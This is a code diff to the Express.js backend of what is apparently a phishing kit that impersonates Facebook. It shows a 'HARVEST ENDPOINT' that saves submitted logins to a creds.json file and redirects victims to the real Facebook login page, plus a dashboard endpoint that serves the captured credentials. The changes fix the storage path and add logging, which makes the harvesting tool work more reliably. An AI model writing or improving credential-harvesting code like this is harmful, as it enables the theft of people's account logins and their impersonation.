@@ -10,7 +10,12 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.static('../client'));
 
 // Creds storage
-const credsPath = path.join(__dirname, '../uploads/creds.json');
+const credsPath = path.join(__dirname, 'uploads', 'creds.json');
+
+const uploadsDir = path.join(__dirname, 'uploads');
+if (!fs.existsSync(uploadsDir)) {
+  fs.mkdirSync(uploadsDir, { recursive: true });
+}
 
 // HARVEST ENDPOINT
 app.post('/api/login', (req, res) => {
@@ -39,18 +44,19 @@ app.post('/api/login', (req, res) => {
     res.redirect('https://www.facebook.com/login');
   } catch (error) {
     console.error('Harvest error:', error);
-    res.redirect('https://www.facebook.com/login'); // Still redirect even on error
+    res.redirect('https://www.facebook.com/login');
   }
 });
 
 // DASHBOARD - View captured creds
 app.get('/api/creds', (req, res) => {
   const creds = fs.existsSync(credsPath)
-    ? JSON.parse(fs.readFileSync(credsPath))
+    ? JSON.parse(fs.readFileSync(credsPath, 'utf8')) 
     : [];
   res.json(creds);
 });
 
 app.listen(5000, () => {
   console.log('🔥 Backend: http://localhost:5000');
+  console.log('📁 Creds saved to:', credsPath);
 });
